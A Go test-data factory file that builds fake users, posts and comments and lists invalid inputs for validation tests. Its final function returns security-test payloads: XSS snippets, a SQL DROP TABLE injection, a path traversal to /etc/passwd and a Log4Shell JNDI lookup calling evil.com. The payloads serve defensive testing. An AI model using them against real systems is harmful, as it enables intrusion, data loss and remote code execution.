package factories

import (
	"fmt"
	"time"
	"strings"

	"github.com/brianvoe/gofakeit/v6"
)

// UserData represents test user data
type UserData struct {
	Username string `json:"username"`
	Email    string `json:"email"`
	Password string `json:"password"`
	ID       int64  `json:"id,omitempty"`
	Token    string `json:"token,omitempty"`
}

// PostData represents test post data
type PostData struct {
	ID      int64    `json:"id,omitempty"`
	Title   string   `json:"title"`
	Content string   `json:"content"`
	Tags    []string `json:"tags"`
	UserID  int64    `json:"user_id,omitempty"`
}

// CommentData represents test comment data
type CommentData struct {
	ID      int64  `json:"id,omitempty"`
	Content string `json:"content"`
	PostID  int64  `json:"post_id"`
	UserID  int64  `json:"user_id"`
}

// UserFactory creates test user data
type UserFactory struct {
	counter int
}

// NewUserFactory creates a new user factory
func NewUserFactory() *UserFactory {
	return &UserFactory{counter: 0}
}

// Create generates a single user
func (f *UserFactory) Create() *UserData {
	f.counter++
	timestamp := time.Now().Unix()
	
	return &UserData{
		Username: fmt.Sprintf("testuser_%d_%d", f.counter, timestamp),
		Email:    fmt.Sprintf("test_%d_%d@example.com", f.counter, timestamp),
		Password: "password123",
	}
}

// CreateWithCustomData creates user with custom fields
func (f *UserFactory) CreateWithCustomData(username, email, password string) *UserData {
	return &UserData{
		Username: username,
		Email:    email,
		Password: password,
	}
}

// CreateMultiple generates multiple users
func (f *UserFactory) CreateMultiple(count int) []*UserData {
	users := make([]*UserData, count)
	for i := 0; i < count; i++ {
		users[i] = f.Create()
	}
	return users
}

// CreateBatch generates users with specific patterns
func (f *UserFactory) CreateBatch(namePrefix string, count int) []*UserData {
	users := make([]*UserData, count)
	timestamp := time.Now().Unix()
	
	for i := 0; i < count; i++ {
		users[i] = &UserData{
			Username: fmt.Sprintf("%s_%d_%d", namePrefix, i+1, timestamp),
			Email:    fmt.Sprintf("%s_%d_%d@example.com", namePrefix, i+1, timestamp),
			Password: "password123",
		}
	}
	return users
}

// PostFactory creates test post data
type PostFactory struct {
	counter int
}

// NewPostFactory creates a new post factory
func NewPostFactory() *PostFactory {
	return &PostFactory{counter: 0}
}

// Create generates a single post
func (f *PostFactory) Create() *PostData {
	f.counter++
	
	titles := []string{
		"Amazing Discovery in Tech",
		"Today's Thoughts and Reflections",
		"Life Update: What's New",
		"Breaking Tech News Alert",
		"Random Musings and Ideas",
		"Weekly Review and Insights",
		"Project Update and Progress",
		"Learning Journey Continues",
	}
	
	contents := []string{
		"This is an amazing discovery I wanted to share with everyone. The implications are huge!",
		"Here are my thoughts for today. Life has been interesting lately with many changes.",
		"Quick life update for everyone following my journey. Thanks for your support!",
		"Latest tech news that caught my attention. This could change everything we know.",
		"Some random thoughts I had while working on this project. Hope you find them useful.",
		"Weekly review of what I've learned and accomplished. Excited for what's next!",
		"Update on the project I've been working on. Making great progress lately.",
		"My learning journey continues with new discoveries and insights every day.",
	}
	
	tagSets := [][]string{
		{"tech", "innovation", "discovery"},
		{"life", "personal", "thoughts"},
		{"update", "news", "announcement"},
		{"tech", "news", "breaking"},
		{"random", "ideas", "musings"},
		{"weekly", "review", "insights"},
		{"project", "update", "progress"},
		{"learning", "education", "growth"},
	}
	
	index := (f.counter - 1) % len(titles)
	
	return &PostData{
		Title:   titles[index],
		Content: contents[index],
		Tags:    tagSets[index],
	}
}

// CreateWithUserID creates post for specific user
func (f *PostFactory) CreateWithUserID(userID int64) *PostData {
	post := f.Create()
	post.UserID = userID
	return post
}

// CreateWithCustomData creates post with custom data
func (f *PostFactory) CreateWithCustomData(title, content string, tags []string) *PostData {
	return &PostData{
		Title:   title,
		Content: content,
		Tags:    tags,
	}
}

// CreateMultiple generates multiple posts
func (f *PostFactory) CreateMultiple(count int) []*PostData {
	posts := make([]*PostData, count)
	for i := 0; i < count; i++ {
		posts[i] = f.Create()
	}
	return posts
}

// CreateRandomized creates post with completely random data
func (f *PostFactory) CreateRandomized() *PostData {
	return &PostData{
		Title:   gofakeit.Sentence(5),
		Content: gofakeit.Paragraph(2, 5, 10, " "),
		Tags:    []string{gofakeit.Word(), gofakeit.Word(), gofakeit.Word()},
	}
}

// CommentFactory creates test comment data
type CommentFactory struct {
	counter int
}

// NewCommentFactory creates a new comment factory
func NewCommentFactory() *CommentFactory {
	return &CommentFactory{counter: 0}
}

// Create generates a single comment
func (f *CommentFactory) Create() *CommentData {
	f.counter++
	
	comments := []string{
		"This is a great post! Thanks for sharing.",
		"I completely agree with your point of view.",
		"Interesting perspective. I never thought of it that way.",
		"Thanks for the detailed explanation. Very helpful!",
		"Amazing content as always. Keep up the good work!",
		"I have a question about this topic. Can you elaborate?",
		"This really resonates with me. Thanks for posting.",
		"Great insights! Looking forward to more content like this.",
	}
	
	index := (f.counter - 1) % len(comments)
	
	return &CommentData{
		Content: comments[index],
	}
}

// CreateForPost creates comment for specific post
func (f *CommentFactory) CreateForPost(postID int64) *CommentData {
	comment := f.Create()
	comment.PostID = postID
	return comment
}

// CreateForPostAndUser creates comment for specific post and user
func (f *CommentFactory) CreateForPostAndUser(postID, userID int64) *CommentData {
	comment := f.Create()
	comment.PostID = postID
	comment.UserID = userID
	return comment
}

// CreateWithCustomContent creates comment with custom content
func (f *CommentFactory) CreateWithCustomContent(content string) *CommentData {
	return &CommentData{
		Content: content,
	}
}

// CreateMultiple generates multiple comments
func (f *CommentFactory) CreateMultiple(count int) []*CommentData {
	comments := make([]*CommentData, count)
	for i := 0; i < count; i++ {
		comments[i] = f.Create()
	}
	return comments
}

// ValidationData provides data for validation testing
type ValidationData struct{}

// NewValidationData creates validation data provider
func NewValidationData() *ValidationData {
	return &ValidationData{}
}

// InvalidEmails returns list of invalid email formats
func (v *ValidationData) InvalidEmails() []string {
	return []string{
		"invalid-email",
		"@example.com",
		"user@",
		"user space@example.com",
		"user..double.dot@example.com",
		"user@.com",
		"",
	}
}

// InvalidPasswords returns list of invalid passwords
func (v *ValidationData) InvalidPasswords() []string {
	return []string{
		"",      // empty
		"12",    // too short
		"x",     // single character
		strings.Repeat("x", 73), // too long (max 72)
	}
}

// InvalidUsernames returns list of invalid usernames
func (v *ValidationData) InvalidUsernames() []string {
	return []string{
		"",      // empty
		strings.Repeat("x", 101), // too long (max 100)
		"user@name", // invalid characters
		"user name", // spaces
	}
}

// InvalidPostTitles returns list of invalid post titles
func (v *ValidationData) InvalidPostTitles() []string {
	return []string{
		"",      // empty
		strings.Repeat("x", 101), // too long (max 100)
	}
}

// InvalidPostContents returns list of invalid post contents
func (v *ValidationData) InvalidPostContents() []string {
	return []string{
		"",      // empty
		strings.Repeat("x", 1001), // too long (max 1000)
	}
}

// SpecialCharacterData returns data with special characters for security testing
func (v *ValidationData) SpecialCharacterData() []string {
	return []string{
		"<script>alert('xss')</script>",
		"'; DROP TABLE users; --",
		"../../../etc/passwd",
		"${jndi:ldap://evil.com/a}",
		"{{7*7}}",
		"<img src=x onerror=alert(1)>",
	}
}